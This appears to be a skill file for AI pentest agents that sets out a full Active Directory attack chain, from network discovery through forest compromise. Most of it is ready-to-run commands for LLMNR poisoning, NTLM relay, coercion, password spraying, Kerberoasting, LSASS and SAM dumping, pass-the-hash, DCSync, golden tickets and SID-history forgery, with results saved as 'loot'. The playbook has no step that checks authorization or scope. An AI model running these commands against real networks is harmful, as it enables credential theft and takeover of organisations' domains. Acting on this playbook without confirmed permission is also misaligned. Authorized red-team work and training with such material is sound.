---
name: ad-attack-methodology
version: 1.0.0
description: >
  Master Active Directory attack methodology reference based on the Orange
  Cyberdefense AD Pentest Mindmap (2025.03) and MITRE ATT&CK Enterprise Matrix.
  Covers the full privilege progression from No Creds through Forest compromise.
phases: [1, 2, 3, 4, 5]
agents: [recon, access, exploit, attack]
sources:
  - https://orange-cyberdefense.github.io/ocd-mindmaps/
  - https://attack.mitre.org/matrices/enterprise/
  - https://www.thehacker.recipes/ad/
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
---

# AD Attack Methodology — Full Kill Chain Reference

> Orange Cyberdefense AD Mindmap (2025.03) + MITRE ATT&CK
> Privilege progression: No Creds -> Valid Creds -> Admin -> Domain Admin -> Forest

## LEVEL 0: NO CREDENTIALS (Phase 1-2)

### 0.1 Network Discovery & Positioning

**MITRE:** T1046 (Network Service Discovery), T1018 (Remote System Discovery),
T1016 (System Network Configuration Discovery)

Identify own position, discover the network, find DCs.

```bash
# Own position
ip -4 addr show | grep -v tailscale | grep 'inet '
ip route show default
cat /etc/resolv.conf

# ARP sweep (fastest for local subnet)
nmap -sn -PR $SUBNET | tee -a loot/phase1/nmap_arpsweep_$SUBNET_SAFE.out

# Ping sweep (broader)
nmap -sn $SUBNET --min-rate 3000 | tee -a loot/phase1/nmap_pingsweep_$SUBNET_SAFE.out

# Identify DCs via DNS SRV records
nslookup -type=SRV _ldap._tcp.dc._msdcs.$DOMAIN $DNS_SERVER
nslookup -type=SRV _kerberos._tcp.$DOMAIN $DNS_SERVER

# AD service scan (targeted — DCs and high-value ports)
nmap -sS -sV -sC -p 53,88,135,139,389,445,464,636,3268,3269,5985,5986 \
  $SUBNET --min-rate 3000 | tee -a loot/phase1/nmap_ad_services_$SUBNET_SAFE.out
```

### 0.2 SMB Signing Status (CRITICAL for Phase 2 Relay)

**MITRE:** T1046

```bash
# Check SMB signing — hosts without signing are relay targets
netexec smb $SUBNET --gen-relay-list loot/phase1/relay_targets.txt \
  | tee -a loot/phase1/nxc_smb_signing_$SUBNET_SAFE.out
```

**Decision tree:**
- If >0 hosts without SMB signing -> NTLM relay viable (Phase 2 priority)
- If ALL hosts enforce signing -> relay blocked, prioritize poisoning for hash cracking

### 0.3 LLMNR/NBT-NS/mDNS Poisoning

**MITRE:** T1557.001 (LLMNR/NBT-NS Poisoning)

```bash
# Start Responder (passive capture mode first, then active)
responder -I $INTERFACE -dwPv \
  | tee -a loot/phase2/responder_capture.out

# Monitor for captured hashes
cat /opt/lgandx-responder/logs/*.txt
```

**Timing:** Run for 30-60 minutes. If no captures after 60 min, LLMNR/NBT-NS
may be disabled. Pivot to coercion attacks or IPv6.

### 0.4 NTLM Relay Attacks

**MITRE:** T1557.001 (LLMNR/NBT-NS Poisoning), T1550.001 (NTLM Relay)

```bash
# Relay to SMB (dump SAM if victim is local admin on target)
ntlmrelayx.py -tf loot/phase1/relay_targets.txt -smb2support \
  | tee -a loot/phase2/ntlmrelayx_smb.out

# Relay to LDAP (domain enumeration, RBCD setup)
ntlmrelayx.py -t ldap://$DC --delegate-access \
  | tee -a loot/phase2/ntlmrelayx_ldap.out

# Relay to ADCS HTTP enrollment (ESC8)
ntlmrelayx.py -t http://$CA_HOST/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController \
  | tee -a loot/phase2/ntlmrelayx_adcs_esc8.out
```

### 0.5 Coercion Attacks (Force Authentication)

**MITRE:** T1187 (Forced Authentication)

```bash
# PetitPotam (unauthenticated EFS coercion)
python3 PetitPotam.py -d $DOMAIN $LISTENER_IP $TARGET \
  | tee -a loot/phase2/petitpotam_$TARGET.out

# PrinterBug / SpoolService (requires valid creds usually)
python3 printerbug.py $DOMAIN/$USER:$PASS@$TARGET $LISTENER_IP \
  | tee -a loot/phase2/printerbug_$TARGET.out

# DFSCoerce
python3 dfscoerce.py -d $DOMAIN $LISTENER_IP $TARGET \
  | tee -a loot/phase2/dfscoerce_$TARGET.out

# ShadowCoerce
python3 shadowcoerce.py -d $DOMAIN $LISTENER_IP $TARGET \
  | tee -a loot/phase2/shadowcoerce_$TARGET.out
```

**Decision tree:**
- PetitPotam unauthenticated -> try first (no creds needed)
- If PetitPotam patched -> try DFSCoerce, ShadowCoerce
- Combine with ntlmrelayx for relay chains

### 0.6 Null/Anonymous Session Enumeration

**MITRE:** T1087.002 (Domain Account Discovery)

```bash
# Anonymous LDAP bind
ldapsearch -x -H ldap://$DC -b "DC=$DC1,DC=$DC2" "(objectClass=*)" \
  | tee -a loot/phase2/ldap_anon_$DC.out

# Null session SMB
netexec smb $DC -u '' -p '' --shares \
  | tee -a loot/phase2/nxc_null_shares_$DC.out
netexec smb $DC -u '' -p '' --users \
  | tee -a loot/phase2/nxc_null_users_$DC.out

# Guest session SMB
netexec smb $DC -u 'guest' -p '' --shares \
  | tee -a loot/phase2/nxc_guest_shares_$DC.out

# RPC null session
rpcclient -U '' -N $DC -c 'enumdomusers' \
  | tee -a loot/phase2/rpc_null_users_$DC.out
```

### 0.7 IPv6 Attacks (mitm6)

**MITRE:** T1557 (Adversary-in-the-Middle)

```bash
# mitm6 — DHCPv6 poisoning + WPAD
mitm6 -d $DOMAIN -i $INTERFACE \
  | tee -a loot/phase2/mitm6_capture.out

# Pair with ntlmrelayx targeting LDAP
ntlmrelayx.py -6 -t ldaps://$DC -wh wpad.$DOMAIN --delegate-access \
  | tee -a loot/phase2/ntlmrelayx_ipv6_ldap.out
```

### 0.8 Password Spraying (if usernames discovered)

**MITRE:** T1110.003 (Password Spraying)

```bash
# Spray one password at a time — respect lockout policy
netexec smb $DC -u loot/phase2/users.txt -p '$PASSWORD' \
  --no-bruteforce | tee -a loot/phase2/nxc_spray_$PASSWORD_SAFE.out

# Common passwords: Season+Year, Company+Year, Welcome1, Password1
```

**WARNING:** Check password policy FIRST (lockout threshold). One spray per
lockout window. Never exceed threshold - 1 attempts per account.

---

## LEVEL 1: VALID CREDENTIALS — DOMAIN USER (Phase 3)

### 1.1 LDAP Domain Enumeration

**MITRE:** T1087.002 (Domain Account Discovery), T1069.002 (Domain Groups)

```bash
# Full LDAP dump
ldapdomaindump -u "$DOMAIN\\$USER" -p "$PASS" $DC -o loot/phase3/ldap/ \
  | tee -a loot/phase3/ldapdump_$DC.out

# netexec LDAP enum
netexec ldap $DC -u $USER -p $PASS --users \
  | tee -a loot/phase3/nxc_ldap_users_$DC.out
netexec ldap $DC -u $USER -p $PASS --groups \
  | tee -a loot/phase3/nxc_ldap_groups_$DC.out
netexec ldap $DC -u $USER -p $PASS --trusted-for-delegation \
  | tee -a loot/phase3/nxc_delegation_$DC.out
```

### 1.2 BloodHound Collection & Analysis

**MITRE:** T1087.002, T1069.002, T1482 (Domain Trust Discovery)

```bash
# BloodHound-python collection (all methods)
bloodhound-python -d $DOMAIN -u $USER -p "$PASS" -c All \
  -ns $DC --timeout 120 -o loot/phase3/bloodhound/ \
  | tee -a loot/phase3/bloodhound_collection.out
```

**Pi5 ARM64 note:** Use `--timeout 120` for large domains (>500 objects).
BloodHound-python may be slow on ARM64 — expect 2-5x longer than x86.

**Key BloodHound queries (run in BloodHound CE):**
1. Shortest path to Domain Admin
2. Users with DCSync rights
3. Kerberoastable accounts with paths to DA
4. ADCS misconfigured templates
5. Unconstrained delegation hosts
6. Users with GenericAll/WriteDACL on high-value targets

### 1.3 Kerberoasting

**MITRE:** T1558.003 (Kerberoasting)
**Orange Cyberdefense:** Valid Creds -> Kerberoasting

```bash
# Get service account TGS tickets
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request \
  -outputfile loot/phase3/kerberoast_hashes.txt \
  | tee -a loot/phase3/kerberoast_$DC.out

# Crack with hashcat (mode 13100 for RC4, 19700 for AES)
hashcat -m 13100 loot/phase3/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Decision tree:**
- If service account is member of privileged group -> HIGH priority crack
- If service account has constrained delegation -> escalation path via S4U
- If SPN is on a host you can access -> Silver Ticket opportunity

### 1.4 AS-REP Roasting

**MITRE:** T1558.004 (AS-REP Roasting)
**Orange Cyberdefense:** Valid Creds -> AS-REP Roasting

```bash
# Find accounts without Kerberos pre-authentication
impacket-GetNPUsers $DOMAIN/$USER:$PASS -dc-ip $DC -request \
  -outputfile loot/phase3/asrep_hashes.txt \
  | tee -a loot/phase3/asrep_$DC.out

# Crack with hashcat (mode 18200)
hashcat -m 18200 loot/phase3/asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 1.5 ADCS Enumeration

**See:** `skills/adcs-attacks/SKILL.md` for full ESC1-15 reference.

```bash
# Enumerate ADCS with certipy
certipy find -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC \
  -vulnerable -stdout --timeout 120 \
  | tee -a loot/phase3/certipy_enum_$DC.out
```

### 1.6 Share Hunting

**MITRE:** T1135 (Network Share Discovery), T1552.006 (GPP Passwords)

```bash
# Enumerate accessible shares
netexec smb $SUBNET -u $USER -p $PASS --shares \
  | tee -a loot/phase3/nxc_shares_$SUBNET_SAFE.out

# Spider shares for sensitive files
netexec smb $TARGET -u $USER -p $PASS --spider 'C$' \
  --pattern '\.xml$|\.config$|\.ini$|\.txt$|password|credential' \
  | tee -a loot/phase3/nxc_spider_$TARGET.out

# GPP passwords in SYSVOL
netexec smb $DC -u $USER -p $PASS -M gpp_password \
  | tee -a loot/phase3/nxc_gpp_$DC.out
```

### 1.7 ACL/DACL Analysis

**MITRE:** T1069.002 (Domain Groups)

Key ACL abuse paths from BloodHound:
- **GenericAll** on user -> reset password, set SPN (targeted kerberoast)
- **GenericAll** on group -> add self to group
- **GenericAll** on computer -> RBCD, Shadow Credentials
- **WriteDACL** -> grant self GenericAll, then abuse
- **WriteOwner** -> take ownership, then WriteDACL
- **ForceChangePassword** -> reset target password
- **AddMember** -> add self to target group

```bash
# Targeted ACL abuse: add self to group
net rpc group addmem "$TARGET_GROUP" "$USER" -U "$DOMAIN/$USER%$PASS" -S $DC

# Targeted ACL abuse: reset password
net rpc password "$TARGET_USER" "$NEW_PASS" -U "$DOMAIN/$USER%$PASS" -S $DC
```

### 1.8 Delegation Analysis

**Orange Cyberdefense:** Valid Creds -> Delegation Abuse

```bash
# Find delegation relationships
impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC \
  | tee -a loot/phase3/delegation_$DC.out
```

**Unconstrained Delegation:** If a computer has unconstrained delegation,
any user authenticating to it has their TGT cached. Coerce a DC to
authenticate -> capture DC TGT -> DCSync.

**Constrained Delegation:** S4U2Self + S4U2Proxy to impersonate any user
to the delegated service. If delegated to CIFS or HTTP on a target, get
admin access.

**RBCD (Resource-Based Constrained Delegation):** If you can write to a
computer's msDS-AllowedToActOnBehalfOfOtherIdentity, set up RBCD from a
controlled computer to impersonate admin.

```bash
# RBCD abuse
impacket-rbcd $DOMAIN/$USER:$PASS -dc-ip $DC -delegate-to $TARGET_COMPUTER \
  -delegate-from $CONTROLLED_COMPUTER -action write \
  | tee -a loot/phase3/rbcd_$TARGET_COMPUTER.out

# Get ticket via S4U
impacket-getST $DOMAIN/$CONTROLLED_COMPUTER\$:$MACHINE_PASS \
  -spn cifs/$TARGET_COMPUTER.$DOMAIN -impersonate Administrator -dc-ip $DC \
  | tee -a loot/phase4/s4u_$TARGET_COMPUTER.out
export KRB5CCNAME=Administrator@cifs_$TARGET_COMPUTER.$DOMAIN@$DOMAIN.ccache
```

---

## LEVEL 2: LOCAL ADMIN (Phase 4)

### 2.1 Credential Harvesting

**MITRE:** T1003.001 (LSASS), T1003.002 (SAM), T1003.004 (LSA Secrets)

```bash
# SAM + LSA dump via secretsdump
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET \
  | tee -a loot/phase4/secretsdump_$TARGET.out

# SAM dump via netexec
netexec smb $TARGET -u $USER -p $PASS --sam \
  | tee -a loot/phase4/nxc_sam_$TARGET.out
netexec smb $TARGET -u $USER -p $PASS --lsa \
  | tee -a loot/phase4/nxc_lsa_$TARGET.out

# LSASS dump via netexec (credential harvesting)
netexec smb $TARGET -u $USER -p $PASS -M lsassy \
  | tee -a loot/phase4/nxc_lsassy_$TARGET.out
```

### 2.2 Lateral Movement (Pass-the-Hash / Pass-the-Ticket)

**MITRE:** T1550.002 (Pass the Hash), T1550.003 (Pass the Ticket)
**MITRE:** T1021.002 (SMB/Windows Admin Shares), T1021.006 (WinRM)

```bash
# Pass-the-Hash with psexec
impacket-psexec $DOMAIN/$USER@$TARGET -hashes :$NTHASH \
  | tee -a loot/phase4/psexec_pth_$TARGET.out

# Pass-the-Hash with wmiexec (stealthier)
impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :$NTHASH \
  | tee -a loot/phase4/wmiexec_pth_$TARGET.out

# Pass-the-Hash with evil-winrm
evil-winrm -i $TARGET -u $USER -H $NTHASH \
  | tee -a loot/phase4/evilwinrm_pth_$TARGET.out

# Pass-the-Hash with netexec (command execution)
netexec smb $TARGET -u $USER -H $NTHASH -x 'whoami /all' \
  | tee -a loot/phase4/nxc_pth_cmd_$TARGET.out

# Overpass-the-Hash (request TGT from NTLM hash)
impacket-getTGT $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC \
  | tee -a loot/phase4/overpass_$USER.out
export KRB5CCNAME=$USER.ccache
```

**Decision tree for lateral movement:**
- Have NT hash? -> PtH via wmiexec (stealthy) or psexec (reliable)
- Have TGT/TGS? -> PtT with export KRB5CCNAME
- Have cleartext? -> Any method, prefer WinRM if port 5985 open
- Need to pivot? -> Harvest creds on each hop, check for DA path

### 2.3 Remote Execution Methods

| Method | Port | Stealth | Reliability | Command |
|--------|------|---------|-------------|---------|
| psexec | 445 | Low (creates service) | High | `impacket-psexec` |
| wmiexec | 135 | Medium | High | `impacket-wmiexec` |
| smbexec | 445 | Low (creates service) | High | `impacket-smbexec` |
| atexec | 445 | Medium | Medium | `impacket-atexec` |
| dcomexec | 135 | Medium | Medium | `impacket-dcomexec` |
| evil-winrm | 5985 | High | High | `evil-winrm` |

---

## LEVEL 3: DOMAIN ADMIN (Phase 5)

### 3.1 DCSync

**MITRE:** T1003.006 (DCSync)
**Orange Cyberdefense:** Domain Admin -> DCSync

```bash
# Full domain hash dump
impacket-secretsdump $DOMAIN/$DA_USER:$DA_PASS@$DC -just-dc \
  | tee -a loot/phase5/dcsync_$DC.out

# Targeted DCSync (just krbtgt)
impacket-secretsdump $DOMAIN/$DA_USER:$DA_PASS@$DC \
  -just-dc-user krbtgt | tee -a loot/phase5/dcsync_krbtgt_$DC.out

# DCSync via netexec
netexec smb $DC -u $DA_USER -p $DA_PASS -M ntdsutil \
  | tee -a loot/phase5/nxc_ntdsutil_$DC.out
```

### 3.2 Golden Ticket

**MITRE:** T1558.001 (Golden Ticket)
**Orange Cyberdefense:** Domain Admin -> Golden Ticket

```bash
# Create Golden Ticket (requires krbtgt hash from DCSync)
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID \
  -domain $DOMAIN Administrator \
  | tee -a loot/phase5/golden_ticket.out
export KRB5CCNAME=Administrator.ccache

# Validate Golden Ticket
impacket-psexec $DOMAIN/Administrator@$DC -k -no-pass \
  | tee -a loot/phase5/golden_ticket_validate.out
```

### 3.3 DA Validation (Proof of Compromise)

```bash
# Proof: access DC admin share
netexec smb $DC -u $DA_USER -p $DA_PASS --shares \
  | tee -a loot/phase5/da_proof_shares_$DC.out

# Proof: whoami on DC
impacket-wmiexec $DOMAIN/$DA_USER:$DA_PASS@$DC -command 'whoami /all' \
  | tee -a loot/phase5/da_proof_whoami_$DC.out
```

---

## LEVEL 4: FOREST / ENTERPRISE ADMIN (Phase 5 continued)

### 4.1 Forest Trust Enumeration

**MITRE:** T1482 (Domain Trust Discovery)

```bash
# Enumerate domain trusts
netexec ldap $DC -u $DA_USER -p $DA_PASS -M enum_trusts \
  | tee -a loot/phase5/nxc_trusts_$DC.out

# BloodHound cross-domain paths
# Run BH collection against each trusted domain
```

### 4.2 SID History Injection

**MITRE:** T1134.005 (SID-History Injection)
**Orange Cyberdefense:** Domain Admin -> Forest Escalation

```bash
# Golden Ticket with SID History for cross-domain escalation
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $CHILD_SID \
  -domain $CHILD_DOMAIN -extra-sid $FOREST_ROOT_SID-519 Administrator \
  | tee -a loot/phase5/sid_history_ticket.out

# -extra-sid S-1-5-21-...-519 = Enterprise Admins group SID
```

### 4.3 Inter-Realm Trust Ticket

```bash
# Get inter-realm trust key from DCSync output
# Look for: $TRUST_DOMAIN$ account NTLM hash

# Forge inter-realm TGT
impacket-ticketer -nthash $TRUST_HASH -domain-sid $CHILD_SID \
  -domain $CHILD_DOMAIN -extra-sid $PARENT_SID-519 \
  -spn krbtgt/$PARENT_DOMAIN Administrator \
  | tee -a loot/phase5/interrealm_ticket.out
```

---

## MASTER DECISION TREE

```
START (No Creds)
  |
  +-> Network scan -> find DCs, SMB signing status
  |
  +-> SMB signing disabled on targets?
  |     YES -> Run Responder + ntlmrelayx (relay to SMB/LDAP)
  |     NO  -> Run Responder (capture + crack hashes offline)
  |
  +-> No hashes after 30 min?
  |     -> Try PetitPotam (unauth coercion)
  |     -> Try mitm6 + WPAD relay
  |     -> Try null sessions on DCs
  |     -> Try default creds on discovered services
  |     -> Password spray (if usernames found)
  |
  GOT CREDS (Valid User)
  |
  +-> BloodHound collection -> identify shortest path to DA
  +-> Kerberoasting -> crack service accounts
  +-> AS-REP Roasting -> crack preauth-disabled accounts
  +-> ADCS enumeration -> check ESC1-15 (see adcs-attacks skill)
  +-> Share hunting -> sensitive files, GPP passwords
  +-> ACL analysis -> GenericAll, WriteDACL chains
  +-> Delegation analysis -> unconstrained, constrained, RBCD
  |
  GOT LOCAL ADMIN
  |
  +-> Credential harvest (SAM/LSA/LSASS) on each compromised host
  +-> Pass-the-Hash / Pass-the-Ticket -> lateral movement
  +-> Pivot through network -> reach high-value targets
  +-> Repeat credential harvest on each new host
  |
  GOT DOMAIN ADMIN
  |
  +-> DCSync -> dump all domain hashes (krbtgt, DA accounts)
  +-> Golden Ticket -> persistent access
  +-> Forest trust enum -> identify cross-domain paths
  +-> SID History / inter-realm trust -> Enterprise Admin
  |
  FOREST COMPROMISED -> Report
```

---

## Pi5 ARM64 OPERATIONAL NOTES

- **nmap:** Prefer `-sS` (SYN scan) over `-sT` (connect). Use `--min-rate 3000`.
- **BloodHound-python:** Use `--timeout 120`. Expect 2-5x slower than x86.
- **certipy-ad:** Known crashes on ARM64 with >500 templates. Use `--timeout 120`.
- **impacket:** Fully functional on ARM64. No known issues.
- **Responder:** May need python3.11+ manually installed on some ARM64 distros.
- **hashcat:** Limited GPU support on Pi5. For heavy cracking, transfer hashes
  to a dedicated rig. Use `--force` flag for CPU-only mode.
- **General:** Monitor CPU temp during scan-heavy phases. Pi5 throttles at 80C.
